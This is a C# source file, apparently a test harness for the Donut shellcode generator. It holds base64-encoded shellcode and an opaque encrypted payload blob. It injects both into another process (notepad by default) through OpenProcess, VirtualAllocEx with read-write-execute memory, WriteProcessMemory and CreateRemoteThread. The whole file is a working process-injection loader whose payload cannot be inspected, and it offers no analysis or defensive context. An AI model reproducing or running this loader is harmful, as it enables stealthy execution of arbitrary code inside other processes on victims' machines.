﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DonutTest
{
    public class Program
    {
        static string x64 = @"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";
        static string x86 = @"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";

        static string target = "notepad";

        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                target = args[0];
            }

            Inject(x86, x64, target);
        }
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;


        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static int Inject(string x86, string x64, string procName)
        {
            string s;

            if (IntPtr.Size == 4)
            {
                s = x86;
            }
            else
            {
                s = x64;
            }

            byte[] shellcode = Convert.FromBase64String(s);

            Process targetProcess = Process.GetProcessesByName(procName)[0];
            Console.WriteLine(targetProcess.Id.ToString());
            Console.WriteLine(targetProcess.Id);

            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

            //Just to test donut
            byte[] cfg = System.Convert.FromBase64String("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"); //The encrypted config and payload

            IntPtr cfgAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)cfg.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(procHandle, cfgAddress, cfg, (uint)cfg.Length, out bytesWritten);

            CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, cfgAddress, 0, IntPtr.Zero);

            return 0;
        }
    }
}
